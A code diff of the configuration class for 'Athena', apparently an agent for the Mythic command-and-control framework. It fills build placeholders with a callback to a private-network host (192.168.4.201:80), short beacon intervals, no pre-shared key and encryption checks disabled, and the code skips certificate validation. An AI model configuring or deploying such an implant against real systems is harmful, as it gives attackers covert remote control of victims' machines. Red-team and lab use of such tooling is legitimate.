@@ -21,12 +21,12 @@ namespace Athena.Config
         public MythicConfig()
         {
 
-            uuid = "01ea6115-b1e2-4da4-9d27-5055b9b8783b";
+            uuid = "e1d7e189-4616-46bc-92fe-3366ef11db39";
             DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
             this.killDate = kd;
-            int sleep = int.TryParse("callback_interval", out sleep) ? sleep : 60;
+            int sleep = int.TryParse("5", out sleep) ? sleep : 60;
             this.sleep = sleep;
-            int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
+            int jitter = int.TryParse("5", out jitter) ? jitter : 10;
             this.jitter = jitter;
             this.currentConfig = new HTTP();
             this.forwarder = new Forwarder();
@@ -51,19 +51,19 @@ namespace Athena.Config
         public HTTP()
         {
             HttpClientHandler handler = new HttpClientHandler();
-            int callbackPort = Int32.Parse("callback_port");
-            string callbackHost = "callback_host";
-            string getUri = "get_uri";
-            string queryPath = "query_path_name";
-            string postUri = "post_uri";
-            this.userAgent = "%USERAGENT%";
-            this.hostHeader = "%HOSTHEADER%";
+            int callbackPort = Int32.Parse("80");
+            string callbackHost = "http://192.168.4.201";
+            string getUri = "index";
+            string queryPath = "q";
+            string postUri = "data";
+            this.userAgent = "";
+            this.hostHeader = "";
             this.getURL = $"{callbackHost}:{callbackPort}/{getUri}?{queryPath}";
             this.postURL = $"{callbackHost}:{callbackPort}/{postUri}";
-            this.proxyHost = "proxy_host:proxy_port";
-            this.proxyPass = "proxy_pass";
-            this.proxyUser = "proxy_user";
-            this.psk = "AESPSK";
+            this.proxyHost = ":";
+            this.proxyPass = "";
+            this.proxyUser = "";
+            this.psk = "";
 
             //Might need to make this configurable
             ServicePointManager.ServerCertificateValidationCallback =
@@ -100,7 +100,7 @@ namespace Athena.Config
             }
 
             //Doesn't do anything yet
-            this.encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
+            this.encryptedExchangeCheck = bool.Parse("false");
 
             if (!string.IsNullOrEmpty(this.psk))
             {
